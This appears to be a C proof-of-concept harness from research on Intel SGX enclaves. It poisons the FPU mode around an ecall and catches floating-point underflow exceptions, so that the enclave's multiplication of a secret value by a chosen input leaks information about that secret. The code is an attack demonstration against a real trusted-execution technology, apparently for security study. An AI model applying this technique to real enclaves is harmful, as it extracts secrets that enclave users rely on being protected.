#include <stdio.h>
#include <sgx_urts.h>
#include <sgx_error.h>
#include "Enclave/inc_u.h"
#include <fenv.h>
#include <math.h>
#include <signal.h>
#include <float.h>
#include "fpu_lib.h"

#define MAX_SUBNORMAL_DOUBLE        0x000FFFFFFFFFFFF
#define MIN_NORMAL_POSITIVE_DOUBLE  0x0010000000000000

#define SEARCH_SUBNORMAL            1

#define ENCLAVE_PATH                "./Enclave/inc.so"
#define ENCLAVE_DBG                 1
sgx_status_t sgx_rv;
/**
 * Convenience wrapper to make an ecall.
 * Directly before and after the ecall, call the FPU library in ../lib/ that
 * performs the FPU modifications depending on environment variables.
 * This makes it easier to change results without recompiling the binary every
 * time a different FPU mode wants to be tested.
 * 
 * Importantly, this wrapper sets the FPU mode directly before an ecall and 
 * RESETS it directly after. This is crucial as otherwise the attacker poisons
 * her own FPU mode which has an impact on simple functions such as printf.
 * */
#define SGX_ASSERT_FAULTY_POINT(f)                                                       \
    do{                                                                     \
        faulty_point_init();                                                \
        if ( SGX_SUCCESS != (sgx_rv = (f)) )                                \
        {                                                                   \
            printf( "Error calling enclave at %s:%d (rv=0x%x)\n", __FILE__, \
                                                    __LINE__, sgx_rv);      \
            abort();                                                        \
        }                                                                   \
        faulty_point_reset();                                               \
    } while (0)

// Same wrapper but without FPU modifications
#define SGX_ASSERT(f)                                                       \
    do{                                                                     \
        if ( SGX_SUCCESS != (sgx_rv = (f)) )                                \
        {                                                                   \
            printf( "Error calling enclave at %s:%d (rv=0x%x)\n", __FILE__, \
                                                    __LINE__, sgx_rv);      \
            abort();                                                        \
        }                                                                   \
    } while (0)

#define ASSERT(cond)                                                    \
    do {                                                                \
        if (!(cond))                                                    \
        {                                                               \
            perror("[" __FILE__ "] assertion '" #cond "' failed");      \
            exit(-1);                                                   \
        }                                                               \
    } while(0)

void fault_handler_wrapper (int signo, siginfo_t * si, void  *ctx)
{
  void *base_adrs;
  ucontext_t *uc = (ucontext_t *) ctx;

  switch ( signo )
  {
    case SIGFPE:
      base_adrs = si->si_addr;
      printf("Caught float exception w code=%d at adrs abs=%p;\n", si->si_code, base_adrs);
      printf("           --> ");
      switch (si->si_code)
      {
        case FPE_INTDIV:
            printf("FPE_INTDIV\n");
            break;
        case FPE_INTOVF:
            printf("FPE_INTOVF\n");
            break;
        case FPE_FLTDIV:
            printf("FPE_FLTDIV\n");
            break;
        case FPE_FLTOVF:
            printf("FPE_FLTOVF\n");
            break;
        case FPE_FLTUND:
            printf("FPE_FLTUND\n");
            break;
        case FPE_FLTRES:
            printf("FPE_FLTRES\n");
            break;
        case FPE_FLTINV:
            printf("FPE_FLTINV\n");
            break;
        case FPE_FLTSUB:
            printf("FPE_FLTSUB\n");
            break;
        default:
            printf("FPE_UNKNOWN\n");
      }
      break;

    default:
      printf("Caught unknown signal '%d'\n", signo);
  }
      _Exit(1);
}

void register_signal_handler(void)
{
  struct sigaction act, old_act;
  memset(&act, sizeof(sigaction), 0);

  /* Specify handler with signinfo arguments */
  act.sa_sigaction = fault_handler_wrapper;
  act.sa_flags = SA_RESTART | SA_SIGINFO;

  /* Block all signals while the signal is being handled */
  sigfillset(&act.sa_mask);

  ASSERT (!sigaction( SIGFPE, &act, &old_act ));
}

static void usage(char* progname)
{
	fprintf(stdout, "Usage: %s HEX_VALUE_OF_SECRET HEX_VALUE_OF_INPUT\n", progname);
	exit(-1);
}

int main( int argc, char **argv )
{
    sgx_enclave_id_t eid = 0;

    SGX_ASSERT( sgx_create_enclave( ENCLAVE_PATH, ENCLAVE_DBG,
                                    NULL, NULL, &eid, NULL ) );

    register_signal_handler();
	

    double oops, input, secret;
    uint64_t* in_hex = (uint64_t*) &input;
    uint64_t* secret_hex = (uint64_t*)&secret;

    // Get cmdline args
    if(argc != 3)
    {
    	usage(argv[0]);
    }
    
    uint64_t secret_hex_in = strtol(argv[1], NULL, 16);
    uint64_t in_hex_in = strtol(argv[2], NULL, 16);
    
    // and set before we modify the FPU registers 
    // (to prevent the untrusted environment from messing up the data and not the enclave)
    *in_hex = in_hex_in;
    *secret_hex = secret_hex_in;
    SGX_ASSERT( set_secret(eid, secret) );
    
    // This is a pre-set value here close to the "crash" point, in reality we'd determine that with binary search
    // through an external program
    //*in_hex = MIN_NORMAL_POSITIVE_DOUBLE + 2700000000000000 - 285627000000000 -  7*100000000 - 1494*100000 - 135500;
	
    fprintf(stdout, "Secret = %.*e (%p)\n", DBL_DECIMAL_DIG, secret, *secret_hex);
	fprintf(stdout, "Input = %.*e (%p)\n", DBL_DECIMAL_DIG, input, *in_hex);
	
    // We only care for underflow
    ASSERT( !feenableexcept(FE_UNDERFLOW) );
	
    // Simple way of searching ....
    int i = 0;
    {
        SGX_ASSERT_FAULTY_POINT( secret_mul(eid, &oops, input) );
    	
		fprintf(stdout, "%d: oops = %.*e [in = %.*e]\n", i, DBL_DECIMAL_DIG, oops, DBL_DECIMAL_DIG, input);
    }

    return 0;
}
